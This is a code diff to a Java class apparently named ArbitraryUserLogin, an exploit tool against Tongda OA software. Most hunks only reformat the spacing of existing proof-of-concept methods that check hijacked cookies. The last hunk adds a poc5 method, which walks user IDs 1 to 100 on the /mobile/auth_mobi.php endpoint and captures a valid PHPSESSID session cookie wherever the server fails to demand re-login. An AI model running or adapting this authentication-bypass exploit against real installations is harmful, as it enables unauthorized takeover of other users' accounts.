@@ -47,7 +47,7 @@ public class ArbitraryUserLogin {
         //第三步:检测cookie是否可用
         Response response3 = Request.get(url + "/general/", cookie);
         boolean flag = response3.getText().contains("club.tongda2000.com");
-        if(!flag){
+        if (!flag) {
             cookie = null;
         }
         System.out.println("cookie检测结果: " + flag);
@@ -79,7 +79,7 @@ public class ArbitraryUserLogin {
         Response response3 = Request.get(url + "/general/", cookie);
         boolean flag = response3.getText().contains("club.tongda2000.com");
         System.out.println("cookie检测结果: " + flag);
-        if(!flag){
+        if (!flag) {
             cookie = null;
         }
         return cookie;
@@ -99,7 +99,7 @@ public class ArbitraryUserLogin {
         Response response3 = Request.get(url + "/general/", cookie);
         boolean flag = response3.getText().contains("club.tongda2000.com");
         System.out.println("cookie检测结果: " + flag);
-        if(!flag){
+        if (!flag) {
             cookie = null;
         }
         return cookie;
@@ -127,9 +127,29 @@ public class ArbitraryUserLogin {
         Response response3 = Request.get(url + "/general/", cookie);
         boolean flag = response3.getText().contains("club.tongda2000.com");
         System.out.println("cookie检测结果: " + flag);
-        if(!flag){
+        if (!flag) {
             cookie = null;
         }
         return cookie;
+    }
+
+
+    public static String poc5(String url) {
+        String cookie = null;
+        String params = "/mobile/auth_mobi.php?isAvatar=1&uid=%d&P_VER=0";
+        for (int i = 1; i <= 100; i++) {
+            String payload = String.format(params, i);
+//            System.out.println(payload);
+            Response response = Request.get(url + payload);
+            boolean flag = !(response.getText().contains("RELOGIN"));
+            if (flag) {
+                cookie = Other.dataCleaning(response.getHead(), Pattern.compile("(PHPSESSID=.+?);"));
+                System.out.println("漏洞存在, uid=" + i);
+                break;
+            }
+        }
+        System.out.println(cookie);
+        return cookie;
+
     }
 }
